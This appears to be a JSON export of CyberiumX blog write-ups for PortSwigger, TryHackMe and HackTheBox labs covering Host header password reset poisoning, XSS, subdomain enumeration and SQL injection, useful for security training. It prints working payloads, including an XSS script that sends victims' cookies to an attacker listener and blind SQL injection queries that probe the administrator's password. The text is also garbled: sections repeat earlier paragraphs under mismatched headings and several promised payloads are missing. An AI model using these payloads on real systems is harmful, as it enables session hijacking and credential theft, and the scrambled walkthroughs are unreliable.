    "title": "PortSwigger- Basic Password Reset Poisoning",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/06/Basic-Password-Reset-Poisoning.png",
    "desc": "Hello Folks, This blog focuses on HTTP Host Header vulnerability. We will cover the basics of the HTTP Host header and then we will see a practical implementation of identifying...",
    "readTime": "9 min read",
    "content": {
      "intro": "Hello Folks, This blog focuses on HTTP Host Header vulnerability. We will cover the basics of the HTTP Host header and then we will see a practical implementation of identifying this vulnerability using the PortSwigger platform. In this blog, we will solve the “ Basic password reset poisoning ” lab under Password Reset Poisoning . So, let’s begin and understand this vulnerability before exploiting the same. The host header is an HTTP request header that helps to specify which website we want to access. Without this header, our request will not be able to reach the actual web server. The HTTP Host header vulnerability arises when the server processes the value of the Host header in an insecure way without validating it. The attacker can exploit this header and perform malicious server-side attacks like web cache poisoning, Business logic flaw, routing based SSRF, SQL injection, password reset poisoning, etc. Here, we are going to see how we can perform a password reset poisoning attack using the Host Header vulnerability. In this attack, the attacker will try to poison the Password reset functionality of a website by pointing the password reset token to the attacker’s public server. Once the attacker can access the token value, the victim’s password can be easily changed. Let’s understand the same with the help of PortSwigger’s lab.",
      "sections": [
        {
          "heading": "Lab- Basic password reset poisoning",
          "body": [
            "First, we will read the lab’s description and then click on the “ Access the Lab ” button. This lab can be solved using Burp Suite Community Edition . Once the target application is up and running, we have to click on the “ My account ” button. We will find a login page here. We have to click on the “ Forget your password? ” button to target the password reset functionality. We need to provide the username/email of the account whose password we have to reset. We will provide “ wiener ” as the username. After submitting the username, we have to go to our exploit server and click on the “ Email client ” button to access the email server. We will find an email with the password reset link for the wiener user. Let’s click on the email to reset the password. We can provide a new password to reset the password of the wiener user. We can now log in as wiener user with the help of the new password. Now we have to switch to Burp Suite and go to the “ HTTP history ” sub-tab where we will find a POST request to /forgot-password used to generate the password reset link for the wiener user. To identify HTTP Host header vulnerability, we have to take this request to Repeater and replace the original Host header with any arbitrary URL ( cyberiumx.com ). Once we send this request, we will find another password reset link on our email where the actual domain name is replaced with our arbitrary domain name.",
            "Let’s come back to Burp Repeater and this time we will change the value of the Host header to the URL of our exploit server. Also, we have to change the username to carlos so that we can send a password change email to our victim user. Now as soon as the user clicks on the link, their password reset token will be sent to our exploit server logs. Let’s check the logs of our exploit server by clicking on the “ Access log ” button available on our exploit server. There we will find an entry with the token of the victim user.",
            "Let’s copy the token and send the following URL to reset the password of carlos user:"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "tryhackme-whats-your-name",
    "title": "TryHackMe- Whats Your Name?",
    "category": "TryHackMe",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/06/Whats-Your-Name.png",
    "desc": "Hello Folks, In this blog, we are going to solve a challenge that will test our client-side exploitation skills. The name of this challenge is “ Whats Your Name? ” and it is ava...",
    "readTime": "8 min read",
    "content": {
      "intro": "Hello Folks, In this blog, we are going to solve a challenge that will test our client-side exploitation skills. The name of this challenge is “ Whats Your Name? ” and it is available on the TryHackMe platform. This CTF is only available to TryHackMe subscribers . We will be exploring some web application vulnerabilities like Cross-site Scripting (XSS), Session Hijacking, and Sensitive data exposure. Let’s start solving the challenge and begin the penetration testing process. We have to start the machine by clicking on the “ Start Machine ” button and scan the obtained IP address using the Nmap tool with the help of the following command.",
      "sections": [
        {
          "heading": "Getting Moderator's Flag",
          "body": [
            "nmap -sS &lt;Machine_IP&gt;",
            "We will find three open ports i.e. 22 (SSH), 80 (HTTP), and 8081 (HTTP) . Let’s enumerate HTTP port 80 by adding the domain name on the /etc/hosts file. We can open the browser and visit the website.",
            "On the webpage, we will find a registration form as we click on the “ Register ” button. Let’s provide some details here and try to test the parameters for XSS vulnerability. The field which seems vulnerable is “ Name ”, so we can provide the following payload on this field to steal the cookies of the user who will check our registration details:"
          ]
        },
        {
          "heading": "Getting Admin's Flag",
          "body": [
            "We will find three open ports i.e. 22 (SSH), 80 (HTTP), and 8081 (HTTP) . Let’s enumerate HTTP port 80 by adding the domain name on the /etc/hosts file. We can open the browser and visit the website.",
            "On the webpage, we will find a registration form as we click on the “ Register ” button. Let’s provide some details here and try to test the parameters for XSS vulnerability. The field which seems vulnerable is “ Name ”, so we can provide the following payload on this field to steal the cookies of the user who will check our registration details:",
            "&lt;script&gt;document.location=&#8221;http://&lt;Kali_IP&gt;:1337/cookie?c=&#8221;+document.cookie&lt;/script&gt;"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "hackthebox-boardlight",
    "title": "HackTheBox- BoardLight",
    "category": "HackTheBox",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/06/BoardLight.png",
    "desc": "Hello Folks, In this blog, we are going to discuss as well as solve another easy machine of the HackTheBox platform named “ BoardLight ”. This machine is based on the Linux oper...",
    "readTime": "10 min read",
    "content": {
      "intro": "Hello Folks, In this blog, we are going to discuss as well as solve another easy machine of the HackTheBox platform named “ BoardLight ”. This machine is based on the Linux operating system and will help us understand how important it is to update the applications running on servers. Let’s begin the penetration testing process. You guys can start the machine available on HackTheBox platform. We know the process. First of all, we have to start with port scanning using the Nmap tool with the help of the following command:",
      "sections": [
        {
          "heading": "Getting Foothold on BoardLight",
          "body": [
            "nmap -sS &lt;Machine_IP&gt;",
            "After completing the scan, we confirmed that 2 ports are open; 22 (SSH) and 80 (HTTP) .",
            "We know that we have to start the enumeration process using HTTP protocol for which we need to open our browser and type the machine IP address to access the website. As we browsed through the website, we found an email address where the domain name of the website was mentioned. We can simply add the same on the “ /etc/hosts ” file so that we can access the website via the domain name ( board.htb ) After that, we performed directory busting and got nothing special but when we performed subdomain enumeration using gobuster we got a result. The command is as follows:"
          ]
        },
        {
          "heading": "Privilege Escalation on BoardLight",
          "body": [
            "After completing the scan, we confirmed that 2 ports are open; 22 (SSH) and 80 (HTTP) .",
            "We know that we have to start the enumeration process using HTTP protocol for which we need to open our browser and type the machine IP address to access the website. As we browsed through the website, we found an email address where the domain name of the website was mentioned. We can simply add the same on the “ /etc/hosts ” file so that we can access the website via the domain name ( board.htb ) After that, we performed directory busting and got nothing special but when we performed subdomain enumeration using gobuster we got a result. The command is as follows:",
            "gobuster vhost -url http://board.htb -append-domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -exclude-length 301 2&gt;/dev/null"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "portswigger-exploiting-other-categories-in-sql-injection",
    "title": "PortSwigger- Exploiting Other Categories in SQL Injection",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/05/Exploiting-Other-Categories-in-SQL-Injection.png",
    "desc": "Hello folks, In this blog post, we will explore some other techniques to identify and exploit SQL Injection vulnerabilities. We will use PortSwigger’s platform to understand it....",
    "readTime": "10 min read",
    "content": {
      "intro": "Hello folks, In this blog post, we will explore some other techniques to identify and exploit SQL Injection vulnerabilities. We will use PortSwigger’s platform to understand it. We have covered Union-based SQL Injection and Blind-based SQL Injection in our previous blogs. You can explore them. &nbsp;",
      "sections": [
        {
          "heading": "Lab-1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
          "body": [
            "Some applications display only limited data based on parameters while we browse them but if we target these parameters using SQL Injection, then we might display all the hidden content stored in the database. In this scenario, we will use the SQL injection attack to retrieve the hidden contents. Let’s read the lab description and click on the “ Access the lab ” button. Also, start the Burp Suite community edition to solve this lab. We must identify a vulnerable parameter to exploit SQL injection on any application. In this application, we have a category parameter that can be seen by clicking on various product categories mentioned on the homepage. As we click on any product category, we will just find some limited products but if we provide the following payload just after the product name, we will find released as well as unreleased products of that category:",
            "This query will comment the remaining query and the server will not be able to confirm that the product is unreleased and show all the products for the mentioned category.",
            "Now, if we want to list all the products available on the database, we have to use the following payload:"
          ]
        },
        {
          "heading": "Lab-2 SQL injection vulnerability allowing login bypass",
          "body": [
            "This query will comment the remaining query and the server will not be able to confirm that the product is unreleased and show all the products for the mentioned category.",
            "Now, if we want to list all the products available on the database, we have to use the following payload:",
            "In this query, we provided a statement that is always true and hence we will get the list of all the available products on the application."
          ]
        },
        {
          "heading": "Lab-3 SQL injection with filter bypass via XML encoding",
          "body": [
            "Now, if we want to list all the products available on the database, we have to use the following payload:",
            "In this query, we provided a statement that is always true and hence we will get the list of all the available products on the application.",
            "On login pages, we are asked to provide our username and password based on which we are authenticated to access our account. Attackers can bypass the application logic by using SQL injection attacks. Let’s read the lab description and click on the “ Access the lab ” button. Also, start the Burp Suite community edition to solve this lab. To bypass the authentication functionality, we require a login page which we can access by clicking on the “ My account ” button. Now we have to log in as administrator user to solve the lab which can be done using the following payload of SQL injection attack on username parameter:"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "blind-sql-injection-2",
    "title": "PortSwigger- Blind SQL Injection-II",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/05/Blind-SQL-Injection-II.png",
    "desc": "Hello folks, In this blog, we will understand Blind SQL Injection vulnerability by triggering time delays and out-of-band requests. We will utilize the PortSwigger platform to e...",
    "readTime": "10 min read",
    "content": {
      "intro": "Hello folks, In this blog, we will understand Blind SQL Injection vulnerability by triggering time delays and out-of-band requests. We will utilize the PortSwigger platform to explore this vulnerability. In the previous blog, we covered the concepts of blind-based SQL injection using conditional responses, conditional errors, and verbose error messages. If you want to learn about it, you can visit our blog . Let’s begin the penetration testing process to identify and exploit blind SQL injection.",
      "sections": [
        {
          "heading": "Lab-1 Blind SQL injection with time delays",
          "body": [
            "Some application handles the errors properly and the user will not be able to get any error. In this situation, we can get data from the database by generating time delays depending on the condition’s response. For this lab, we will just try to generate the time delays. Let’s read the lab description and click on the “ Access the lab ” button. This lab can be solved using the Burp Suite Community edition. To identify SQL injection vulnerability, we need a parameter. Here we have a cookie parameter named TrackingId . We can reload the webpage to get the cookie. Now, let’s switch to the burp suite and take this request to Repeater . To generate time delays, we need to know the type of database that we do not know, so we have to target all databases one by one using the SQL injection cheat sheet . We tried payloads for Oracle, MSSQL, and MySQL databases but it didn’t work. Finally, we tried the following payload associated with the PostgreSQL database and it worked:",
            "&#8216;; (SELECT pg_sleep(10))––",
            "Here, we used semicolon (;) which terminated the previous SQL query and executed the malicious query provided by us. Hence we received the response after 10 seconds which confirms that this parameter is vulnerable to blind SQL injection and the lab is solved."
          ]
        },
        {
          "heading": "Lab-2 Blind SQL injection with time delays and information retrieval",
          "body": [
            "&#8216;; (SELECT pg_sleep(10))––",
            "Here, we used semicolon (;) which terminated the previous SQL query and executed the malicious query provided by us. Hence we received the response after 10 seconds which confirms that this parameter is vulnerable to blind SQL injection and the lab is solved.",
            "In this situation, we will try to generate the time delays and exploit the same to get data from the database. Let’s read the lab description and click on the “ Access the lab ” button. We will require a Burp Suite Professional for this lab. We need to repeat the same steps that we performed in the previous lab and identify the parameter vulnerable to time-based blind SQL injection. After performing the previous steps we will confirm that the TrackingId cookie parameter is vulnerable. Now let’s exploit this vulnerability by finding the password of the administrator user for which we require to find the length of the password. We will use the following query on the TrackingId parameter to get the length of the password:"
          ]
        },
        {
          "heading": "Lab-3 Blind SQL injection with out-of-band interaction",
          "body": [
            "Here, we used semicolon (;) which terminated the previous SQL query and executed the malicious query provided by us. Hence we received the response after 10 seconds which confirms that this parameter is vulnerable to blind SQL injection and the lab is solved.",
            "In this situation, we will try to generate the time delays and exploit the same to get data from the database. Let’s read the lab description and click on the “ Access the lab ” button. We will require a Burp Suite Professional for this lab. We need to repeat the same steps that we performed in the previous lab and identify the parameter vulnerable to time-based blind SQL injection. After performing the previous steps we will confirm that the TrackingId cookie parameter is vulnerable. Now let’s exploit this vulnerability by finding the password of the administrator user for which we require to find the length of the password. We will use the following query on the TrackingId parameter to get the length of the password:",
            "&#8216;; (SELECT CASE WHEN (length(password)&gt;1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')––"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "portswigger-blind-based-sql-injection-1",
    "title": "PortSwigger- Blind-Based SQL Injection- I",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/05/PortSwigger-5.png",
    "desc": "In this blog, we will understand one of the most identifiable and difficult types of SQL Injection vulnerability . It is Blind SQL Injection . We will learn about the same using...",
    "readTime": "10 min read",
    "content": {
      "intro": "In this blog, we will understand one of the most identifiable and difficult types of SQL Injection vulnerability . It is Blind SQL Injection . We will learn about the same using PortSwigger platform. Let’s begin the blog and understand the meaning of blind SQL injection vulnerability. Blind SQL injection vulnerabilities are those where we send a malicious SQL query to the server but we don’t receive any direct output in the response. In simple terms, even if the application is vulnerable to SQL injection and will execute our malicious SQL query but it will not provide any data within the response. But using various factors like conditional response, errors, or response time, we can still enumerate and fetch data from the SQL database. In this blog, we will be covering how we can retrieve data from a database using conditional responses , conditional errors , and d atabase errors . &nbsp;",
      "sections": [
        {
          "heading": "Lab-1 Blind SQL injection with conditional responses",
          "body": [
            "Conditional response means that the reply we get depends on the SQL query we use. If the query gives a true result, we might get a different response compared to when it gives a false result. We'll look for these responses by using logical operators like AND in our SQL queries. We can read the description of this lab and then click on the “ Access the lab ” button. This lab requires Burp Suite Professional for faster results. To exploit SQL injection vulnerability, we require a parameter whose value interacts with an SQL query. In the lab description, it is mentioned that the TrackingID cookie parameter is vulnerable to SQL injection. So, we will target this parameter for which we need to refresh the home page. Now let’s switch to Burp Suite and under the HTTP history tab, we have to identify the request towards the “ / ” endpoint which contains the Cookie header. We need to take this request to Repeater . On Repeater, we will add the following conditional statement to confirm whether the parameter is vulnerable to SQL injection or not:",
            "&#8216; AND &#8216;a'='a",
            "Here “ &#8216; ” is used to close the previous value of the cookie. AND is a logical operator that results true value when all the provided input values are true. “ &#8216;a'='a ” is used as a value which is always true. After sending the request to the web server, we will find a “ Welcome back ” message in the response."
          ]
        },
        {
          "heading": "Lab-2 Blind SQL injection with conditional errors",
          "body": [
            "&#8216; AND &#8216;a'='a",
            "Here “ &#8216; ” is used to close the previous value of the cookie. AND is a logical operator that results true value when all the provided input values are true. “ &#8216;a'='a ” is used as a value which is always true. After sending the request to the web server, we will find a “ Welcome back ” message in the response.",
            "But if we try the following conditional statement, we will not receive a “Welcome back” message:"
          ]
        },
        {
          "heading": "Lab-3 Visible error-based SQL injection",
          "body": [
            "Here “ &#8216; ” is used to close the previous value of the cookie. AND is a logical operator that results true value when all the provided input values are true. “ &#8216;a'='a ” is used as a value which is always true. After sending the request to the web server, we will find a “ Welcome back ” message in the response.",
            "But if we try the following conditional statement, we will not receive a “Welcome back” message:",
            "&#8216; AND &#8216;a'='b"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  },
  {
    "slug": "portswigger-examining-the-database-using-union-based-sql-injection",
    "title": "PortSwigger- Examining the Database using Union-based SQL Injection",
    "category": "PortSwigger",
    "image": "https://cyberiumx.com/wp-content/uploads/2024/05/Examining-the-database-using-Union-based-SQL-injection.png",
    "desc": "Hello folks, This blog will be based on Examining the Database using Union-based SQL Injection vulnerabilities. We will understand how we can get the database version and inform...",
    "readTime": "10 min read",
    "content": {
      "intro": "Hello folks, This blog will be based on Examining the Database using Union-based SQL Injection vulnerabilities. We will understand how we can get the database version and information related to tables and columns present in the database. We will explore the same on the PortSwigger platform. We have discussed the basics of Union-based SQL injection in our previous blog which you can explore. Let’s start and begin the penetration testing process. &nbsp;",
      "sections": [
        {
          "heading": "Lab-1 SQL injection attack, querying the database type and version on Oracle",
          "body": [
            "We can identify the database version based on different DBMS by exploiting Union-based SQL injection. We can refer to the SQL injection cheat sheet where under the “ Database version ” section, we have the useful syntax for querying the database version. In this scenario, we are exploring the same for Oracle databases. We can read the lab description and click “ Access the lab ”. This lab can be performed without Burp Suite as well. We must find a vulnerable parameter to exploit SQL injection attacks. On the home page, we will find different categories of products. Let’s click on any one of the categories to view some parameters. We can now see that we have a GET parameter on the URL named “ category ” where we can try to provide our malicious SQL query. We know that this is an Oracle database so there is a mandatory condition that is required to fulfil. In Oracle databases, it is compulsory to provide the “ FROM ” keyword with a valid table name. Now, let’s create a payload to determine the number of columns. We can start with a single null keyword and then increase it one by one as follows:",
            "&#8216; UNION SELECT null from dual–– &#8216; UNION SELECT null,null from dual––",
            "We will find that the second query gives you a valid response which means that there are two columns. Now let’s find out the data type of each column using the following statements:"
          ]
        },
        {
          "heading": "Lab-2 SQL injection attack, querying the database type and version on MySQL and Microsoft",
          "body": [
            "&#8216; UNION SELECT null from dual–– &#8216; UNION SELECT null,null from dual––",
            "We will find that the second query gives you a valid response which means that there are two columns. Now let’s find out the data type of each column using the following statements:",
            "&#8216; UNION SELECT &#8216;a',null from dual–– &#8216; UNION SELECT null,'b' from dual––"
          ]
        },
        {
          "heading": "Lab-3 SQL injection attack, listing the database contents on non-Oracle databases",
          "body": [
            "We will find that the second query gives you a valid response which means that there are two columns. Now let’s find out the data type of each column using the following statements:",
            "&#8216; UNION SELECT &#8216;a',null from dual–– &#8216; UNION SELECT null,'b' from dual––",
            "Both statements provided a non-error value which confirms that these columns have varchar data type. Finally, we will use the following query to get the version detail of the Oracle database:"
          ]
        }
      ],
      "conclusion": "Happy Pentesting! Team CyberiumX"
    }
  }
];
